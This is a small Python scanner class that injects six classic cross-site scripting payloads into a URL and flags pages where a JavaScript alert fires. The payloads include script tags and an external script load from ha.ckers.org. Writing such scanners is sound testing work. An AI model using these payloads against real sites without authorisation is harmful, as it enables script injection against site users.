__author__ = 'popka'

from Page import Page
import utils


class XssChecker(object):

    small_xss_list = ['<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
                      '<IMG SRC=javascript:alert("XSS")>',
                      '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">', # ?????
                      '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
                      '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
                      '<INPUT TYPE="IMAGE" SRC="javascript:alert(XSS);">' #?????
                      ]

    def __init__(self, driver):
        self.driver = driver

    def find_xss(self, url):
        for i in self.small_xss_list:
            xss_url = url.replace(utils.KEY, i)
            page = Page(self.driver, xss_url)
            page.open()
            if (page.is_alert_appear()):
                page.get_alert_text_and_close() # NEED TO CHECK TEXT!
                print('xss was found on: ', xss_url)
                return xss_url # Maybe all variants ???

        return False







